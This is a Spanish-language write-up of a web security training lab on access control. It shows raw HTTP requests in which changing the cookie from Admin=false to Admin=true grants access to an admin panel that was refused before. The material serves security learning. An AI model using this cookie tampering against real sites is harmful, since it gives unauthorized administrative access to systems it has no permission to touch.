# Lab 3: User role controlled by request parameter

Luego de hacer login se detecta la siguiente peticion:

```
GET /admin HTTP/2
Host: 0a5a002f03e4d92b82bf7e89005400a3.web-security-academy.net
Cookie: Admin=false; session=dgVJMe3ocQnMRrKY3ECMibFyiA9Y9YfU
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=0, i


```

Y esta responde asi:

```
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2598

Admin interface only available if logged in as an administrator
```

Se procede a manipular el valor de la cookie:

```
GET /admin HTTP/2
Host: 0a5a002f03e4d92b82bf7e89005400a3.web-security-academy.net
Cookie: Admin=true; session=dgVJMe3ocQnMRrKY3ECMibFyiA9Y9YfU
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=0, i


```

Y se puede apreciar que el cambio a TRUE nos permite acceder al portal administrativo:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3115

```

Y al renderizar el DOM se ve asi:

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
